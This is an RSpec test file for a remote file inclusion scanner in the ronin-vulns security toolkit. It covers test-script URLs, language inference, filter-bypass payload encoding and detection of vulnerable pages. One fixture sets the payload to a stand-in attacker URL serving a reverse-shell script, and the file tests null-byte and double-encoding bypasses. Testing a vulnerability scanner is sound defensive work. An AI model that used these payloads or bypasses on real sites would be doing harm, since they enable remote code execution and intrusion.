require 'spec_helper'
require 'web_vuln_examples'
require 'ronin/vulns/rfi'

require 'webmock/rspec'

describe Ronin::Vulns::RFI do
  describe "TEST_SCRIPT_URLS" do
    subject { described_class::TEST_SCRIPT_URLS }

    {
      asp:         ".asp",
      asp_net:     ".aspx",
      cold_fusion: ".cfm",
      jsp:         ".jsp",
      php:         ".php",
      perl:        ".pl"
    }.each do |key,ext|
      describe "#{key.inspect}" do
        let(:key) { key }
        let(:ext) { ext }

        subject { super()[key] }

        it "must equal 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/\#{VERSION}/data/rfi_test.#{ext}'" do
          expect(subject).to eq("https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test#{ext}")
        end

        it "must be a publically accessible URL", :network do
          response = Net::HTTP.get_response(URI(subject))

          expect(response.code.to_i).to eq(200)
          expect(response.body).to_not be_empty
        end
      end
    end
  end

  describe ".infer_scripting_lang" do
    subject { described_class }

    context "when the given URL's path ends in '.asp'" do
      let(:url) { "https://example.com/page.asp?id=1" }

      it "must return :asp" do
        expect(subject.infer_scripting_lang(url)).to be(:asp)
      end
    end

    context "when the given URL's path ends in '.aspx'" do
      let(:url) { "https://example.com/page.aspx?id=1" }

      it "must return :asp_net" do
        expect(subject.infer_scripting_lang(url)).to be(:asp_net)
      end
    end

    context "when the given URL's path ends in '.cfm'" do
      let(:url) { "https://example.com/page.cfm?id=1" }

      it "must return :cold_fusion" do
        expect(subject.infer_scripting_lang(url)).to be(:cold_fusion)
      end
    end

    context "when the given URL's path ends in '.cfml'" do
      let(:url) { "https://example.com/page.cfml?id=1" }

      it "must return :cold_fusion" do
        expect(subject.infer_scripting_lang(url)).to be(:cold_fusion)
      end
    end

    context "when the given URL's path ends in '.jsp'" do
      let(:url) { "https://example.com/page.jsp?id=1" }

      it "must return :jsp" do
        expect(subject.infer_scripting_lang(url)).to be(:jsp)
      end
    end

    context "when the given URL's path ends in '.php'" do
      let(:url) { "https://example.com/page.php?id=1" }

      it "must return :php" do
        expect(subject.infer_scripting_lang(url)).to be(:php)
      end
    end

    context "when the given URL's path ends in '.pl'" do
      let(:url) { "https://example.com/page.pl?id=1" }

      it "must return :perl" do
        expect(subject.infer_scripting_lang(url)).to be(:perl)
      end
    end
  end

  describe ".test_script_for" do
    subject { described_class }

    context "when the given URL's path ends in '.asp'" do
      let(:url) { "https://example.com/page.asp?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.asp'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.asp"
        )
      end
    end

    context "when the given URL's path ends in '.aspx'" do
      let(:url) { "https://example.com/page.aspx?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.aspx'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.aspx"
        )
      end
    end

    context "when the given URL's path ends in '.cfm'" do
      let(:url) { "https://example.com/page.cfm?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.cfm'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.cfm"
        )
      end
    end

    context "when the given URL's path ends in '.cfml'" do
      let(:url) { "https://example.com/page.cfml?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.cfm'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.cfm"
        )
      end
    end

    context "when the given URL's path ends in '.jsp'" do
      let(:url) { "https://example.com/page.jsp?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.jsp'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.jsp"
        )
      end
    end

    context "when the given URL's path ends in '.php'" do
      let(:url) { "https://example.com/page.php?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.php'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.php"
        )
      end
    end

    context "when the given URL's path ends in '.pl'" do
      let(:url) { "https://example.com/page.pl?id=1" }

      it "must return 'https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.pl'" do
        expect(subject.test_script_for(url)).to eq(
          "https://raw.githubusercontent.com/ronin-rb/ronin-vulns/#{Ronin::Vulns::VERSION}/data/rfi_test.pl"
        )
      end
    end
  end

  let(:query_param) { 'bar' }
  let(:url)         { "https://example.com/page?foo=1&bar=2&baz=3" }

  subject { described_class.new(url, query_param: query_param) }

  describe "#initialize" do
    include_examples "Ronin::Vulns::Web#initialize examples"

    it "must default #test_script_url to .test_script_for(url)" do
      expect(subject.test_script_url).to eq(described_class.test_script_for(url))
    end

    it "must default #filter_bypass to nil" do
      expect(subject.filter_bypass).to be(nil)
    end

    context "when given the test_script_url: keyword argument" do
      let(:test_script_url) { 'https://example.com/alternate/test_script.php' }

      subject do
        described_class.new(url, query_param:     query_param,
                                 test_script_url: test_script_url)
      end

      it "must set #test_script_url" do
        expect(subject.test_script_url).to eq(test_script_url)
      end
    end

    context "when given the filter_bypass: keyword argument" do
      let(:filter_bypass) { :null_byte }

      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: filter_bypass)
      end

      it "must set #filter_bypass" do
        expect(subject.filter_bypass).to eq(filter_bypass)
      end
    end
  end

  let(:rfi_url) { 'http://evil.com/reverse_shell.php' }

  describe "#encode_payload" do
    let(:uri_escaped_rfi_url) { URI::QueryParams.escape(rfi_url) }

    it "must return the unencoded RFI URL as a String by default" do
      expect(subject.encode_payload(rfi_url)).to eq(rfi_url)
    end

    context "when #filter_bypass is :null_byte" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :null_byte)
      end

      it "must append %00 to the RFI URL" do
        expect(subject.encode_payload(rfi_url)).to eq("#{rfi_url}\0")
      end
    end

    context "when #filter_bypass is :double_encode" do
      subject do
        described_class.new(url, query_param:   query_param,
                                 filter_bypass: :double_encode)
      end

      let(:double_uri_escaped_rfi_url) do
        URI::QueryParams.escape(rfi_url)
      end

      it "must URI escape the RFI URL twice" do
        expect(subject.encode_payload(rfi_url)).to eq(double_uri_escaped_rfi_url)
      end
    end
  end

  describe "#exploit" do
    let(:payload) { subject.encode_payload(rfi_url) }

    include_examples "Ronin::Vulns::Web#exploit examples"
  end

  describe "#vulnerable?" do
    let(:request_url) { subject.exploit_url(subject.test_script_url) }
    let(:response_body) do
      <<~HTML
        <html>
          <body>
            <p>example content</p>
            <p>included content</p>
            <p>more content</p>
          </body>
        </html>
      HTML
    end
    let(:response) { double('Net::HTTPResponse', body: response_body) }

    before do
      expect(subject).to receive(:exploit).with(subject.test_script_url).and_return(response)
    end

    it "must call #exploit with #test_script_url" do
      subject.vulnerable?
    end

    context "when the response body contains 'Security Alert: Remote File Inclusion Detected!''" do
      let(:response_body) do
        <<~HTML
          <html>
            <body>
              <p>example content</p>
              Security Alert: Remote File Inclusion Detected!
              <p>more content</p>
            </body>
          </html>
        HTML
      end

      it "must return true" do
        expect(subject.vulnerable?).to be(true)
      end
    end

    context "when the response body does not contain 'Security Alert: Remote File Inclusion Detected!'" do
      it "must return false" do
        expect(subject.vulnerable?).to be(false)
      end
    end
  end
end
